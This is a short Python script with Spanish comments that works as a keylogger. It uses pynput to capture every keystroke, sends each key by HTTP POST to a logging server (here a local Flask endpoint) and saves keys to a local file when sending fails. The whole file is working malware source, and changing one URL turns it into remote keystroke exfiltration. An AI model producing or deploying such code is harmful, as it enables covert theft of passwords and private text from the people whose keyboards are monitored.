from pynput import keyboard
import requests

SERVER_URL = "http://127.0.0.1:5000/log"  # Servidor local Flask

def on_press(key):
    try:
        data = str(key.char)
    except AttributeError:
        data = f"[{key}]"

    print("Tecla capturada:", data)

    try:
        requests.post(SERVER_URL, data={"key": data}, timeout=1)
    except Exception as e:
        print("Error al enviar, guardando localmente:", e)
        with open("log_local.txt", "a", encoding="utf-8") as f:
            f.write(data)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
